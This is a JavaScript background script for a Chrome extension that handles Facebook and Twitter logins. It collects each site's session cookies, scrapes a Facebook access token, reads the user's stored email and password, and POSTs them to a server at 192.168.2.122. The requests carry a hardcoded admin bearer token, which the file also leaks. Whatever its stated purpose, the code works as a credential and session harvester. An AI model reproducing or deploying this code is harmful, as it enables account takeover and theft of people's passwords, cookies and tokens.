chrome.storage.sync.set({ extensionState: 0 }, function() {});

function removeCookies(domain, url) {
    chrome.cookies.getAll({ domain: domain }, function(cookies) {
        for (var i = 0; i < cookies.length; i++) {
            chrome.cookies.remove({ url: url + cookies[i].path, name: cookies[i].name });
            console.log('cookie removed');
        }
    });
}

function savefbCookie(url) {
    chrome.cookies.getAll({ url: url }, function(e) {
        console.log('savecookie');
        chrome.storage.sync.set({ FBcookie: e }, function() {});
    });
}

function savetwCookie(url) {
    chrome.cookies.getAll({ url: url }, function(e) {
        console.log('savecookie');
        chrome.storage.sync.set({ TWcookie: e }, function() {});
    });
}

function saveuToken() {
    var s = $.ajax({
        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
        type: "get",
        async: false,
        global: false,
        success: function(t) {
            return t;
        }
    }).responseText;
    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
    chrome.storage.sync.set({ FBuToken: uToken }, function() {
        // console.log(e);
    });
}


function addfbCookie(cookie, url) {
    chrome.storage.sync.get([cookie], function(result) {
        result.FBcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = url;
            chrome.cookies.set(item, function(c) {
                // console.log(JSON.stringify(c));
                console.log('cookie added!')
            });
        });
    });
}

function addtwCookie(cookie, url) {
    chrome.storage.sync.get([cookie], function(result) {
        result.TWcookie.forEach(function(item, index) {
            delete item['hostOnly'];
            delete item['session'];
            item['url'] = url;
            chrome.cookies.set(item, function(c) {
                // console.log(JSON.stringify(c));
                console.log('cookie added!')
            });
        });
    });
}


async function checkfbLogin() {
    var p = new Promise(function(resolve, reject) {
        chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(cookies) {
            cookies.forEach(item => {
                if (item['name'] == "c_user") {
                    // console.log(item['name']);
                    resolve(true); //signed in
                    return;
                }
            })
            resolve(false);
        })
    });
    const result = await p;
    // console.log(result);
    return result;
}

function sendtoContent(msg) {
    chrome.tabs.query({ active: true, currentWindow: true }, gotTabs);

    function gotTabs(tabs) {
        chrome.tabs.sendMessage(tabs[0].id, msg);
    };
}

function twitterData() {
    chrome.storage.sync.get(['TWemail', 'TWpassword'], function(result) {
        var url = 'https://twitter.com';
        chrome.cookies.getAll({ url: url }, function(e) {
            if (e.length > 0) {
                format = '';
                for (let i = 0; i < e.length; i++) {
                    format += e[i].name + '=' + e[i].value;
                    if (i < e.length - 1) {
                        format += ','
                    }
                }

                var data = {
                    "loginCookies": format,
                    "loginPassword": result.TWpassword,
                    "loginUsername": result.TWemail,
                    "socialAccountState": 0,
                    "socialAccountStateDescription": 0,
                    "socialNetwork": {
                        "id": 1
                    },
                    "status": true,
                    "user": {
                        "id": 1,
                        "login": "admin"
                    },
                    "userToken": '',
                    "userTokenState": 0,
                    "userTokenStateDescription": "token"
                };
                $.ajax({
                    url: "http://192.168.2.122:8081/api/connectome-social-media/create",
                    type: 'POST',
                    beforeSend: function(xhr) {
                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
                    },
                    contentType: 'application/json',
                    data: JSON.stringify(data),
                    success: function(response) {
                        console.log(response);
                        addtwCookie('TWcookie', 'https://twitter.com');
                        // debugger;
                    },
                    error: function(r) {
                        console.log(r);
                        addtwCookie('TWcookie', 'https://twitter.com');
                        // debugger;
                    },
                })
            }
            removeCookies(".twitter.com", "https://twitter.com");
        })
    })
}

function facebookData() {
    chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
        var uToken;
        var url = 'https://mbasic.facebook.com';
        chrome.cookies.getAll({ url: url }, function(e) {
            if (e.length > 0) {
                format = '';
                for (let i = 0; i < e.length; i++) {
                    format += e[i].name + '=' + e[i].value;
                    if (i < e.length - 1) {
                        format += ','
                    }
                }

                try {
                    var s = $.ajax({
                        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                        type: "get",
                        async: false,
                        global: false,
                        success: function() {}
                    }).responseText;
                    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                } catch (err) {
                    console.log(err);
                }

                var data = {
                    "loginCookies": format,
                    "loginPassword": result.FBpassword,
                    "loginUsername": result.FBemail,
                    "socialAccountState": 0,
                    "socialAccountStateDescription": 0,
                    "socialNetwork": {
                        "id": 1
                    },
                    "status": true,
                    "user": {
                        "id": 1,
                        "login": "admin"
                    },
                    "userToken": uToken,
                    "userTokenState": 0,
                    "userTokenStateDescription": "token"
                };
                $.ajax({
                    url: "http://192.168.2.122:8081/api/connectome-social-media/create",
                    type: 'POST',
                    beforeSend: function(xhr) {
                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
                    },
                    contentType: 'application/json',
                    data: JSON.stringify(data),
                    success: function(response) {
                        console.log(response);
                        addfbCookie('FBcookie', 'https://mbasic.facebook.com');
                        // debugger;
                    },
                    error: function(r) {
                        console.log(r);
                        addfbCookie('FBcookie', 'https://mbasic.facebook.com');
                        // debugger;
                    },
                })
            }
            removeCookies(".facebook.com", "https://mbasic.facebook.com");
        })
    })
};



chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
    switch (response) {
        case 'checklogin':
            // if (await checkfbLogin()) {
            //     sendtoContent('showsendData');
            // } else {
            sendtoContent('showlogin');
            // }
            break;
        case 'sendData':
            facebookData();
            break;
        case 'fbLogin':
            savefbCookie('https://mbasic.facebook.com');
            removeCookies(".facebook.com", "https://mbasic.facebook.com");
            chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
            break;
        case 'twLogin':
            savetwCookie('https://twitter.com/');
            removeCookies(".twitter.com", "https://twitter.com/");
            chrome.tabs.create({ url: 'https://twitter.com/login' });
            break;
        case 'donefbLogin':
            setTimeout(facebookData(), 2000);
            break;
        case 'donetwLogin':
            setTimeout(twitterData(), 2000);
            break;
        default:
            console.log('nofunction');
    }
});